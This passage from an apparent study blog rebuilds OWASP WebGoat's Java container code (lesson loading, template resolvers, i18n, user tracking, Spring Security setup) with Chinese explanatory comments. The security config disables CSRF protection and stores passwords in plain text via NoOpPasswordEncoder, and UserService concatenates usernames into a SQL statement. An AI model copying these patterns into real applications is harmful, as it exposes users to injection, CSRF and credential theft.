import lombok.extern.slf4j.Slf4j;
import org.springframework.core.io.support.ResourcePatternResolver;
import org.springframework.stereotype.Component;

import java.io.IOException;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.regex.Pattern;

@Component
//@Componnet是用在类上，声明这个类是一个组件被spring管理起来
@Slf4j
//使用日志组件
public class LessonScanner {
    private static final Pattern lessonPattern = Pattern.compile("^.*/lessons/([^/]*)/.*$");
//            使用的是Java中的Pattern.compile函数来实现对指定字符串的截取。 匹配 aaa/lessons//aaa 为啥匹配这个? 是文件名吗
    @Getter
    private final Set<String > lessons = new HashSet<>();
//    用于存放读取到的lessons

    public LessonScanner(ResourcePatternResolver resourcePatternResolver){
        //       ResourcePatternResolver 用于解析资源文件的策略接口，其特殊的地方在于，它应该提供带有*号这种通配符的资源路径。

        try {
            var resources = resourcePatternResolver.getResources("classpath:/lessons/*/*");
            for (var resource : resources){
                var url = resource.getURL();
//                这里的url我感觉是路径的意思 其实是一个file协议去读取lessons的内容
                var matcher = lessonPattern.matcher(url.toString());
                if (matcher.matches()){
//                    如果匹配到了就添加到上面的lessons中数组中
                    lessons.add(matcher.group(1));

                }

            }
            log.debug("Found {} lessons",lessons.size());
//            打印日志看看找到了多少个lessons文件
        } catch (IOException e) {
            log.warn("No lessons found...");
//            打印lessons没有找到的日志
        }
//                加载多文件

    }
    public List<String > applyPattern(String pattern){
        return lessons.stream().map(lesson -> String.format(pattern,lesson)).toList();
//        使用stream() 将源数据—包括集合、数组等转换成流  将集合中的每一个字符进行格式化输出 将数据存储到列表中
    }
}
```

![image-20220703144834368](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220703144834368.png)

## LessonTemplateResolver

```java
package com.wanan.webgoat.container;

import lombok.extern.slf4j.Slf4j;
import org.springframework.core.io.ResourceLoader;
import org.thymeleaf.IEngineConfiguration;
import org.thymeleaf.templateresolver.FileTemplateResolver;
import org.thymeleaf.templateresource.ITemplateResource;
import org.thymeleaf.templateresource.StringTemplateResource;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;

@Slf4j
public class LessonTemplateResolver extends FileTemplateResolver {
    private static final String PREFIX = "lesson:";
//    定义前缀
    private ResourceLoader resourceLoader;
//    定义资源加载器
    private Map<String ,byte[]> resources = new HashMap<>();
//    定义容器存放加载到的文件

    public LessonTemplateResolver(ResourceLoader resourceLoader){
        this.resourceLoader = resourceLoader;
        setResolvablePatterns(Set.of(PREFIX + "*"));
//        设置新的 模式 应用建立的 模板可以通过这个模板解析器来解决。  Set.of用于简单的创建不可变的少量元素的集合
    }

    @Override
    protected ITemplateResource computeTemplateResource(IEngineConfiguration configuration,String ownerTemplate, String template, String resourceName, String characterEncoding, Map<String, Object> templateResolutionAttributes) {
        var templateName = resourceName.substring(PREFIX.length());
//        截取模板的名字
        byte[] resource = resources.get(templateName);
//        获取存在map中的这个值
        if (resource == null){
            try {
                resource = resourceLoader.getResource("classpath:/" + templateName).getInputStream().readAllBytes();
            } catch (IOException e) {
                log.error("Unable to find lesson HTML:{}",template);
            }
            resources.put(templateName,resource);
        }
    return new StringTemplateResource(new String(resource, StandardCharsets.UTF_8));
    }

}
```

## AsciiDoctorTemplateResolver.java

```java
/**
 * ************************************************************************************************
 * This file is part of WebGoat, an Open Web Application Security Project utility. For details,
 * please see http://www.owasp.org/
 * <p>
 * Copyright (c) 2002 - 2014 Bruce Mayhew
 * <p>
 * This program is free software; you can redistribute it and/or modify it under the terms of the
 * GNU General Public License as published by the Free Software Foundation; either version 2 of the
 * License, or (at your option) any later version.
 * <p>
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
 * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 * <p>
 * You should have received a copy of the GNU General Public License along with this program; if
 * not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA
 * 02111-1307, USA.
 * <p>
 * Getting Source ==============
 * <p>
 * Source for this application is maintained at https://github.com/WebGoat/WebGoat, a repository for free software
 * projects.
 * <p>
 *
 * @author WebGoat
 * @version $Id: $Id
 * @since December 12, 2015
 */

package org.owasp.webgoat.container;

import lombok.extern.slf4j.Slf4j;
import org.asciidoctor.Asciidoctor;
import org.asciidoctor.extension.JavaExtensionRegistry;
import org.owasp.webgoat.container.asciidoc.OperatingSystemMacro;
import org.owasp.webgoat.container.asciidoc.UsernameMacro;
import org.owasp.webgoat.container.asciidoc.WebGoatTmpDirMacro;
import org.owasp.webgoat.container.asciidoc.WebGoatVersionMacro;
import org.owasp.webgoat.container.asciidoc.WebWolfMacro;
import org.owasp.webgoat.container.asciidoc.WebWolfRootMacro;
import org.springframework.core.io.ResourceLoader;
import org.thymeleaf.IEngineConfiguration;
import org.thymeleaf.templateresolver.FileTemplateResolver;
import org.thymeleaf.templateresource.ITemplateResource;
import org.thymeleaf.templateresource.StringTemplateResource;

import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.StringWriter;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;

import static org.asciidoctor.Asciidoctor.Factory.create;

/**
 * Thymeleaf resolver for AsciiDoc used in the lesson, can be used as follows inside a lesson file:
 * <p>
 * <code>
 * <div th:replace="doc:AccessControlMatrix_plan.adoc"></div>
 * </code>
 */
@Slf4j
public class AsciiDoctorTemplateResolver extends FileTemplateResolver {

    private static final Asciidoctor asciidoctor = create();
    private static final String PREFIX = "doc:";
    private final ResourceLoader resourceLoader;

    public AsciiDoctorTemplateResolver(ResourceLoader resourceLoader) {
        this.resourceLoader = resourceLoader;
        setResolvablePatterns(Set.of(PREFIX + "*"));
    }

    @Override
    protected ITemplateResource computeTemplateResource(IEngineConfiguration configuration, String ownerTemplate, String template, String resourceName, String characterEncoding, Map<String, Object> templateResolutionAttributes) {
        var templateName = resourceName.substring(PREFIX.length());

        try (InputStream is = resourceLoader.getResource("classpath:/" + templateName).getInputStream()) {
            JavaExtensionRegistry extensionRegistry = asciidoctor.javaExtensionRegistry();
            extensionRegistry.inlineMacro("webWolfLink", WebWolfMacro.class);
            extensionRegistry.inlineMacro("webWolfRootLink", WebWolfRootMacro.class);
            extensionRegistry.inlineMacro("webGoatVersion", WebGoatVersionMacro.class);
            extensionRegistry.inlineMacro("webGoatTempDir", WebGoatTmpDirMacro.class);
            extensionRegistry.inlineMacro("operatingSystem", OperatingSystemMacro.class);
            extensionRegistry.inlineMacro("username", UsernameMacro.class);

            StringWriter writer = new StringWriter();
            asciidoctor.convert(new InputStreamReader(is), writer, createAttributes());
            return new StringTemplateResource(writer.getBuffer().toString());
        } catch (IOException e) {
            return new StringTemplateResource("<div>Unable to find documentation for: " + templateName + " </div>");
        }
    }

    private Map<String, Object> createAttributes() {
        Map<String, Object> attributes = new HashMap<>();
        attributes.put("source-highlighter", "coderay");
        attributes.put("backend", "xhtml");
        attributes.put("icons", org.asciidoctor.Attributes.FONT_ICONS);

        Map<String, Object> options = new HashMap<>();
        options.put("attributes", attributes);

        return options;
    }
}
```

![image-20220703205540754](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220703205540754.png)

![image-20220703205741992](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220703205741992.png)

## asciidoc

### WebWolfMacro

```java
package com.wanan.webgoat.container.asciidoc;

import org.asciidoctor.ast.ContentNode;
import org.asciidoctor.extension.InlineMacroProcessor;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.servlet.http.HttpServletRequest;
import java.util.HashMap;
import java.util.Map;

public class WebWolfMacro extends InlineMacroProcessor {
    public WebWolfMacro(String macroName){
        super(macroName);
    }
    public WebWolfMacro(String macroName, Map<String, Object> config){
        super(macroName,config);
    }
    @Override
    public Object process(ContentNode contentNode,String linkText,Map<String,Object> attributes){
        var env = EnvironmentExposure.getEnv();
        var hostname = determineHost(env.getProperty("webwolf.port"));
//        这里的webwolf.port其实就是配置文件中的webwolf端口
        var target = (String ) attributes.getOrDefault("target","home");
//        这里设定默认值为home?
        var href = hostname + "/" +target;
        if (displayCompleteLinkNoFormatting(attributes)){
//            判断是一个nolink的话
            linkText = href;
        }
        var options = new HashMap<String ,Object>();
        options.put("type",":link");
        options.put("target",href);
        attributes.put("window","_blank");
        return createPhraseNode(contentNode,"anchor",linkText,attributes,options).convert();


    }

    private boolean displayCompleteLinkNoFormatting(Map<String ,Object> attributes){
        return attributes.values().stream().anyMatch(a->a.equals("noLink"));
    }
    private String determineHost(String port){
        HttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest();
        String host = request.getHeader("Host");
//        获取请求头中的host
        int semicolonIndex = host.indexOf(":");
//        将host以:进行分割获取:的位置
        if (semicolonIndex == -1 || host.endsWith(":80")){
//            如果没有找到: 或者host是以:80结尾,那么就将:80进行替换 将www.web ...进行替换
            host = host.replace(":80","").replace("www.webgoat.local","www.webwolf.local");
        }else {
            host = host.substring(0,semicolonIndex);
            //            将host以semicolonIndex 进行分割
            host = host.concat(":").concat(port);
//            将9090进行拼接进去
        }
        return "http://"+host +(includeWebWolfContext() ? "/WebWolf":"");
    }
    protected boolean includeWebWolfContext(){
        return true;
    }


}
```

可以自己调试一下

![image-20220704140556124](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220704140556124.png)

### EnvironmentExposure

```java
package com.wanan.webgoat.container.asciidoc;

import org.springframework.core.env.Environment;
import org.springframework.beans.BeansException;
import org.springframework.context.ApplicationContext;
import org.springframework.context.ApplicationContextAware;

public class EnvironmentExposure implements ApplicationContextAware {
    private static ApplicationContext context;
    public static Environment getEnv(){
        return context.getEnvironment();
    }

    @Override
    public void setApplicationContext(ApplicationContext applicationContext) throws BeansException {
        context = applicationContext;
    }
}

```

### WebWolfRootMacro

```java
package com.wanan.webgoat.container.asciidoc;

import java.util.Map;

public class WebWolfRootMacro extends WebWolfMacro{
    public WebWolfRootMacro(String macroName){
        super(macroName);
    }
    public WebWolfRootMacro(String macroName, Map<String,Object> config){
        super(macroName,config);
    }
    @Override
    protected boolean includeWebWolfContext(){
        return false;
    }
}
```

### WebGoatVersionMacro

```java
package com.wanan.webgoat.container.asciidoc;

import org.asciidoctor.ast.ContentNode;
import org.asciidoctor.extension.InlineMacroProcessor;

import java.util.Map;

public class WebGoatVersionMacro extends InlineMacroProcessor {
    public WebGoatVersionMacro(String macroName){super(macroName);}
    public WebGoatVersionMacro(String macroName, Map<String,Object> config){super(macroName,config);}
    
    @Override
    public Object process(ContentNode contentNode,String target,Map<String,Object> attributes){
        var webgoatVersion = EnvironmentExposure.getEnv().getProperty("webgoat.build.version");
        return createPhraseNode(contentNode,"quoted",webgoatVersion);
    }
}
```

### WebGoatTmpDirMacro

```java
package com.wanan.webgoat.container.asciidoc;

import org.asciidoctor.ast.ContentNode;
import org.asciidoctor.extension.InlineMacroProcessor;

import java.util.Map;

public class WebGoatTmpDirMacro extends InlineMacroProcessor {
    public WebGoatTmpDirMacro(String macroName){super(macroName);}
    
    public WebGoatTmpDirMacro(String macroName, Map<String ,Object> config){
        super(macroName, config);
    }
    @Override
    public Object process(ContentNode contentNode,String  target,Map<String ,Object> attributes){
        var env = EnvironmentExposure.getEnv().getProperty("webgoat.server.directory");
        return createPhraseNode(contentNode,"quoted",env);
    }
    
    
}
```

### OperatingSystemMacro

```java
package com.wanan.webgoat.container.asciidoc;

import org.asciidoctor.ast.ContentNode;
import org.asciidoctor.extension.InlineMacroProcessor;

import java.util.Map;

public class OperatingSystemMacro extends InlineMacroProcessor {
    public OperatingSystemMacro(String macroName){super(macroName);}
    
    public OperatingSystemMacro(String macroName, Map<String,Object> config){
        super(macroName,config);
    }
    @Override
    public Object process(ContentNode contentNode,String target,Map<String ,Object> attributes){
        var osName = System.getProperty("os.name");
        return createPhraseNode(contentNode,"quoted",osName);
    }
    
}

```

### UsernameMacro

```java
package com.wanan.webgoat.container.asciidoc;

import com.wanan.webgoat.container.WebGoat;
import com.wanan.webgoat.container.users.WebGoatUser;
import org.asciidoctor.ast.ContentNode;
import org.asciidoctor.extension.InlineMacroProcessor;
import org.springframework.security.core.context.SecurityContextHolder;

import java.util.Map;

public class UsernameMacro extends InlineMacroProcessor {
    public UsernameMacro(String macroName){super(macroName);}

    public UsernameMacro(String macroName, Map<String,Object> config){
        super(macroName,config);
    }
    @Override
    public Object process(ContentNode contentNode,String target,Map<String ,Object> attributes){
        var auth = SecurityContextHolder.getContext().getAuthentication();
        var username = "unknown";
        if (auth.getPrincipal() instanceof WebGoatUser webGoatUser){
            username = webGoatUser.getUsername();
        }
        return createPhraseNode(contentNode,"quoted",username);

    }

}
```

## i18n

### PluginMessages

```java
package com.wanan.webgoat.container.i18n;

import org.springframework.context.support.ReloadableResourceBundleMessageSource;
import org.springframework.core.io.support.ResourcePatternResolver;

import java.io.IOException;
import java.util.Properties;

public class PluginMessages extends ReloadableResourceBundleMessageSource {
    private static final String PROPERTIES_SUFFIX = ".properties";
//    定义后缀
    private final Language language;
    private final ResourcePatternResolver resourcePatternResolver;
    public PluginMessages(Messages messages,Language language,ResourcePatternResolver resourcePatternResolver){
        this.language = language;
        this.setParentMessageSource(messages);
        this.setBasename("WebGoatLabels");
        this.resourcePatternResolver = resourcePatternResolver;
//        进行初始化
    }

    @Override
    protected PropertiesHolder refreshProperties(String filename,PropertiesHolder propertiesHolder){
        Properties properties = new Properties();
        long lastModified = System.currentTimeMillis();

        try {
            var resources = resourcePatternResolver.getResources("classpath:/lessons/**/i18n"+
                    "/WebGoatLabels"+PROPERTIES_SUFFIX);
            for (var resource : resources){
                String sourcePath = resource.getURI().toString().replace(PROPERTIES_SUFFIX,"");
//                获取资源路径
                PropertiesHolder holder = super.refreshProperties(sourcePath,propertiesHolder);
                properties.putAll(holder.getProperties());
            }
        } catch (IOException e) {
            logger.error("Unable to read plugin message",e);
//            打印异常
        }
        return new PropertiesHolder(properties,lastModified);
    }
    public Properties getMessages(){return getMergedProperties(language.getLocale()).getProperties();}
    public String getMessage(String code,Object... args){return getMessage(code,args,language.getLocale());}
    public String getMessage(String code,String defaultValue,Object... args){
        return super.getMessage(code,args,defaultValue,language.getLocale());
    }
}
```

### Language

```java
package com.wanan.webgoat.container.i18n;

import lombok.AllArgsConstructor;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.LocaleResolver;

import java.util.Locale;

@AllArgsConstructor
//作用于类，生成参数为所有实例变量的构造函数
public class Language {
    private final LocaleResolver localeResolver;
    public Locale getLocale(){
        return localeResolver.resolveLocale(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());
        
    }

}
```

### Messages

```java
package com.wanan.webgoat.container.i18n;

import lombok.AllArgsConstructor;
import org.springframework.context.support.ReloadableResourceBundleMessageSource;

import java.util.Properties;
@AllArgsConstructor
//作用于类，生成参数为所有实例变量的构造函数
public class Messages extends ReloadableResourceBundleMessageSource {
    private final Language language;
    public Properties getMessages(){return getMergedProperties(language.getLocale()).getProperties();}
    public String getMessage(String code,Object... args){return getMessage(code,args,language.getLocale());}
    public String getMessage(String code,String defaultValue,Object... args){
        return super.getMessage(code,args,defaultValue,language.getLocale());
    }

}
```

## session

### LabelDebugger

```java
package com.wanan.webgoat.container.session;

import java.io.Serializable;

public class LabelDebugger implements Serializable {
    private boolean enabled=false;
    
    public boolean isEnabled(){return enabled;}
    
    public void enable(){
        this.enabled = true;
    }
    public void disable(){this.enabled = false;}
    public void setEnabled(boolean enabled){this.enabled = enabled;}
    
    
}
```

# 启动试一下

报这个错

![image-20220705104852655](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220705104852655.png)

这里查这个错误 最后还是没找到具体那个依赖出现了问题,这里最终也是排除到了依赖上面出了问题,这里我们就直接使用webgoat的依赖了,其中有一个问题

![image-20220705172611280](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220705172611280.png)

使用时需要先删除这个日志管理

启动之后这里做了渲染,是自带的吗

![image-20220705172753229](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220705172753229.png)

其实这是Spring Boot自带的安全自动配置

在日志这里也有密码 用户名是user

![image-20220705204826857](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220705204826857.png)

测试一下是没有问题的

![image-20220705205054461](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220705205054461.png)

这里我们是因为还没有配置WebSecurityConfig所以才会这样

# container

## WebSecurityConfig

资料

```java
/**
 * .loginPage("/login.html")指定了跳转到登录页面的请求URL，
 * .loginProcessingUrl("/login")对应登录页面form表单的action="/login"，
 * .antMatchers("/login.html").permitAll()表示跳转到登录页面的请求不被拦截
 * @param http
 * @throws Exception
 */
@Override
protected void configure(HttpSecurity http) throws Exception {
    http.addFilterBefore(validateCodeFilter, UsernamePasswordAuthenticationFilter.class) // 添加验证码校验过滤器
            .addFilterBefore(smsCodeFilter, UsernamePasswordAuthenticationFilter.class) // 添加短信验证码校验过滤器
            .formLogin() // 表单登录
            // http.httpBasic() // HTTP Basic
            .loginPage("/authentication/require") // 登录跳转 URL, 进行验证或者登陆页 跳转
            .loginProcessingUrl("/login") // 处理表单登录 URL
            .successHandler(authenticationSucessHandler) // 处理登录成功
            .failureHandler(authenticationFailureHandler) // 处理登录失败
            .and()
            .rememberMe()
            .tokenRepository(persistentTokenRepository()) // 配置 token 持久化仓库
            .tokenValiditySeconds(3600) // remember 过期时间，单为秒
            .userDetailsService(userDetailService) // 处理自动登录逻辑
            .and()
            .authorizeRequests() // 授权配置
            .antMatchers("/authentication/require", "/login.html", "/code/image",
                    "/code/sms", "/session/invalid", "/css/*", "/js/*", "/login1.html", "/statics/**", "/signout/success").permitAll() // 登录跳转 URL 无需认证 (含登录页的静态资源)
            .anyRequest()  // 所有请求
            .authenticated() // 都需要认证
            .and()
            .sessionManagement() // 添加 Session管理器
            .invalidSessionUrl("/session/invalid") // Session失效后跳转到这个链接
            .maximumSessions(1) //最大session并发数量，超过定义数量前一个session就会失效
            .maxSessionsPreventsLogin(true) //Session达到最大有效数的时候，不再允许相同的账户登录。
            .expiredSessionStrategy(mySessionExpiredStrategy)//配置了Session在并发下失效后的处理策略;
            .sessionRegistry(sessionRegistry)//添加 session 注册
            .and()
            .and()
            .logout()//自定义退出登录
            .logoutUrl("/signout")//退出登录的URL
            .invalidateHttpSession(true)
            //.logoutSuccessUrl("/signout/success")//退出成功后跳转的URL
            .deleteCookies("JSESSIONID")//退出成功后删除名称为JSESSIONID的cookie, 删除不成功？？？
            .logoutSuccessHandler(logOutSuccessHandler) //logoutSuccessHandler指定退出成功处理器来处理退出成功后的逻辑：
            .and()
            .csrf().disable()// 关闭 CSRF攻击防御关了
            .apply(smsAuthenticationConfig);// 将短信验证码认证配置加到 Spring Security 中
```

```java
package com.wanan.webgoat.container;



import com.wanan.webgoat.container.users.UserService;
import lombok.AllArgsConstructor;
import net.sf.cglib.proxy.NoOp;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.config.annotation.web.configurers.ExpressionUrlAuthorizationConfigurer;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.crypto.password.NoOpPasswordEncoder;

@Configuration
//用于定义配置类
@AllArgsConstructor
//自动生成构造方法
@EnableWebSecurity
//@EnableWebSecurity，用于在我们的项目中启用SpringSecurity。为某些请求路径开启安全认证策略。
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {
    private final UserService userDetailsService;

    @Override
    protected void configure(HttpSecurity httpSecurity) throws Exception {
        ExpressionUrlAuthorizationConfigurer<HttpSecurity>.ExpressionInterceptUrlRegistry security = httpSecurity
                .authorizeRequests()
//                http请求是否要登录认证
                .antMatchers("/css/**", "/images/**", "/js/**", "fonts/**", "/plugins/**", "/registration", "/register.mvc", "/actuator/**").permitAll()
//                antMatcher用在多个HttpSecurity的场景下，用来为每个HttpSecurity过滤  permitAll() 不管登入,不登入 都能访问
                .anyRequest().authenticated();
//               任何请求都必须经过身份验证
        security.and()
//                 and() 是将方法链接在一起的一种方式。
                .formLogin()
                .loginPage("/login")
//                在未登录时自动跳转到login页面
                .defaultSuccessUrl("/welcome.mvc", true)
//                登录认证成功之后默认跳转的路径 defaultSuccessUrl 就是说，它会默认跳转到 Referer 来源页面，如果 Referer 为空，没有来源页，则跳转到默认设置的页面。
//        successForwardUrl 表示不管 Referer 从何而来，登录成功后一律跳转到指定的地址  defaultSuccessUrl 中如果第二个参数输入为 true，则效果和 successForwardUrl 一致。
                .usernameParameter("username")
//                登录表单form中用户名输入框中的name名,不修改的话默认是username
                .passwordParameter("password")
//                登录表单form中面输入框input的name名,不修改的话默认就是password
                .permitAll();
//        不需要登录就可以访问的
        security.and()
//                将方法连接在一起的方式NMnmnmMMmMmmMMmmM
                .logout().deleteCookies("JSESSIONID").invalidateHttpSession(true);
//        登出 删除cookies
        security.and().csrf().disable();
//        关闭csrf防护
        httpSecurity.headers().cacheControl().disable();
//      禁用缓存
        httpSecurity.exceptionHandling().authenticationEntryPoint(new AjaxAuthenticationEntryPoint("/login"));
//       添加自定义的未授权和为登录结果返回
    }
    @Autowired
//    这个注解就是spring可以自动帮你把Bean里面引用的对象的setter/getter方法省略,他会自动帮你set/get
    public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception{
        auth.userDetailsService(userDetailsService);
    }

    @Bean
    @Override
    public UserDetailsService userDetailsServiceBean()throws Exception{
        return userDetailsService;
    }
    @Override
    @Bean
    protected AuthenticationManager authenticationManager()throws Exception{
        return super.authenticationManager();
    }
    @SuppressWarnings("deprecation")
//    表示不检测过期的方法,不显示使用了不赞成使用的类或方法时的警告
    @Bean
    public NoOpPasswordEncoder passwordEncoder(){
        return (NoOpPasswordEncoder) NoOpPasswordEncoder.getInstance();
    }
}
```

## users

### UserService

![image-20220707161213187](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220707161213187.png)

```java
package com.wanan.webgoat.container.users;

import com.wanan.webgoat.container.lessons.Initializeable;
import org.flywaydb.core.Flyway;
import lombok.AllArgsConstructor;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.core.userdetails.UsernameNotFoundException;
import org.springframework.stereotype.Service;

import java.util.List;
import java.util.function.Function;

@Service
//@Service注解用于类上，标记当前类是一个service类，加上该注解会将当前类自动注入到spring容器中，不需要再在applicationContext.xml文件定义bean了
@AllArgsConstructor
//生成构造方法
public class UserService implements UserDetailsService {
    private final UserRepository userRepository;
    private final UserTrackerRepository userTrackerRepository;
    private final JdbcTemplate jdbcTemplate;
    //                获取JdbcTemplat实例
    private final Function<String,Flyway> flywayLessons;
    private final List<Initializeable> lessonInitializables;

    @Override
    public WebGoatUser loadUserByUsername(String username) throws UsernameNotFoundException{
        WebGoatUser webGoatUser = userRepository.findByUsername(username);
//        根据用户名查找用户
        if (webGoatUser == null ){
            throw new UsernameNotFoundException("User not found");

        }else {
            webGoatUser.createUser();
            lessonInitializables.forEach(l->l.initialize(webGoatUser));
        }
        return webGoatUser;
    }
    public void addUser(String username ,String password){
        var userAlreadyExists = userRepository.existsByUsername(username);
//        根据用户名查看是否存在用户
        var webGoatUser = userRepository.save(new WebGoatUser(username,password));
//
        if (!userAlreadyExists){
            userTrackerRepository.save(new UserTracker(username));
//            如果用户存在就不会在创建了
            createLessonsForUser(webGoatUser);

        }

    }
    private void createLessonsForUser(WebGoatUser webGoatUser){
        jdbcTemplate.execute("CREATE SCHEMA \""+webGoatUser.getUsername()+"\" authorization dba");
        //使用该实例的execute(String sql)方法执行 SQL语句创建一个以user用户名的数据库
        flywayLessons.apply(webGoatUser.getUsername()).migrate();
//      进行迁移应用

    }
    public List<WebGoatUser> getAllUsers(){return userRepository.findAll();}



}
```

### UserRepository

```java
package com.wanan.webgoat.container.users;


import org.springframework.data.jpa.repository.JpaRepository;

import java.util.List;

public interface UserRepository extends JpaRepository<WebGoatUser,String> {
    WebGoatUser findByUsername(String username);
//    根据用户名去查找用户
    List<WebGoatUser> findAll();
    boolean existsByUsername(String username);
    
}
```

### UserTrackerRepository

```java
package com.wanan.webgoat.container.users;


import org.springframework.data.jpa.repository.JpaRepository;

public interface UserTrackerRepository extends JpaRepository<UserTracker,String> {
    UserTracker findByUser(String user);




}
```

### UserTracker

```java
package com.wanan.webgoat.container.users;

import com.wanan.webgoat.container.lessons.Assignment;
import com.wanan.webgoat.container.lessons.Lesson;
import lombok.extern.slf4j.Slf4j;

import javax.persistence.*;
import java.util.HashSet;
import java.util.Map;
import java.util.Optional;
import java.util.Set;
import java.util.stream.Collectors;

@Slf4j
//启动日志
@Entity
//是指这个类映射到数据库中
public class UserTracker {
    @Id
//    用于声明一个实体类的属性映射为数据库的主键列,该属性通常置于属性语句之前,可与声明语句同行,也可写在单独行上面
    @GeneratedValue
//    公司开发使用Mysql数据库，生产使用Oracle数据库，当同时使用两种数据库时，JPA主键生成策略可以选择GenerationType.Auto来实现。
    private Long id;
    @Column(name="username")
    private String user;
    @OneToMany(cascade = CascadeType.ALL,fetch = FetchType.EAGER)
// @OneToMany 一对多关联映射   @Cascade：相当于set标签的cascade属性 fetch: 加载类型，有lazy和eager两种
    private Set<LessonTracker> lessonTrackers = new HashSet<>();
    public UserTracker(){

    }
    public UserTracker(final String user){
        this.user = user;
    }
    public LessonTracker getLessonTracker(Lesson lesson){
        Optional<LessonTracker> lessonTracker  = lessonTrackers
                .stream().filter(l->l.getLessonName().equals(lesson.getId())).findFirst();
        if (!lessonTracker.isPresent()){
//            如果lessonTracker存在
            LessonTracker newLessonTracker = new LessonTracker(lesson);
            lessonTrackers.add(newLessonTracker);
            return newLessonTracker;
        }else {
            return lessonTracker.get();
        }
    }
    public Optional<LessonTracker> getLessonTracker(String id){
        return lessonTrackers.stream().filter(l->l.getLessonName().equals(id)).findFirst();
    }
    public void assignmentSolved(Lesson lesson,String assignmentName){
        LessonTracker lessonTracker = getLessonTracker(lesson);
        lessonTracker.incrementAttempts();
        lessonTracker.assignmentSolved(assignmentName);

    }
    public void assignmentFailed(Lesson lesson){
        LessonTracker lessonTracker= getLessonTracker(lesson);
        lessonTracker.incrementAttempts();
    }
    public void reset(Lesson al){
        LessonTracker lessonTracker = getLessonTracker(al);
        lessonTracker.reset();
    }
    public int numberOfLessonsSolved(){
        int numberOfLessonsSolved = 0;
        for (LessonTracker lessonTracker:lessonTrackers){
            if (lessonTracker.isLessonSolved()){
                numberOfLessonsSolved = numberOfLessonsSolved+1;

            }
        }
        return numberOfLessonsSolved;
    }
    public int numberOfAssignmentsSolved(){
        int numberOfAssignmentsSolved = 0;
        for (LessonTracker lessonTracker : lessonTrackers){
            Map<Assignment,Boolean> lessonOverview = lessonTracker.getLessonOverview();
            numberOfAssignmentsSolved = lessonOverview.values().stream().filter(b->b).collect(Collectors.counting()).intValue();
        }
        return numberOfAssignmentsSolved;
    }
}
```

### LessonTracker

```java
package com.wanan.webgoat.container.users;

import com.wanan.webgoat.container.lessons.Assignment;
import com.wanan.webgoat.container.lessons.Lesson;
import lombok.Getter;

import javax.persistence.*;
import java.util.*;
import java.util.stream.Collectors;

@Entity
//映射到数据库
public class LessonTracker {
    @Id
//      用于声明一个实体类的属性映射为数据库的主键列,该属性通常置于属性语句之前,可与声明语句同行,也可写在单独行上面
    @GeneratedValue(strategy = GenerationType.AUTO)
    private Long id;
    @Getter
    private String lessonName;
    @OneToMany(cascade = CascadeType.ALL,fetch = FetchType.EAGER)
    private final Set<Assignment> solvedAssignments = new HashSet<>();
    @OneToMany(cascade = CascadeType.ALL,fetch = FetchType.EAGER)
    private final Set<Assignment> allAssignments = new HashSet<>();
    @Getter
    private int numberOfAttempts = 0;
    @Version
    private Integer version;

    private LessonTracker(){

    }
    public LessonTracker(Lesson lesson){
        lessonName = lesson.getId();
        allAssignments.addAll(lesson.getAssignments() == null ? List.of() : lesson.getAssignments());

    }
    public Optional<Assignment> getAssignment(String name){
        return allAssignments.stream().filter(a->a.getName().equals(name)).findFirst();
    }
    public void assignmentSolved(String solvedAssignment){
        getAssignment(solvedAssignment).ifPresent(solvedAssignments::add);
    }
    public boolean isLessonSolved(){return allAssignments.size() == solvedAssignments.size();}
    public void incrementAttempts(){
        numberOfAttempts++;
    }

    void reset(){solvedAssignments.clear();}

    public Map<Assignment,Boolean> getLessonOverview(){
        List<Assignment> notSolved = allAssignments.stream()
                .filter(i-> !solvedAssignments.contains(i))
                .toList();
        Map<Assignment,Boolean> overview = notSolved.stream().collect(Collectors.toMap(a->a,b->false));
        overview.putAll(solvedAssignments.stream().collect(Collectors.toMap(a->a,b->true)));
        return overview;

    }
}

```

## AjaxAuthenticationEntryPoint

```java
package com.wanan.webgoat.container;

import org.springframework.security.core.AuthenticationException;
import org.springframework.security.web.authentication.LoginUrlAuthenticationEntryPoint;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

public class AjaxAuthenticationEntryPoint extends LoginUrlAuthenticationEntryPoint {
    public AjaxAuthenticationEntryPoint(String loginFormUrl){
        super(loginFormUrl);
    }
    @Override
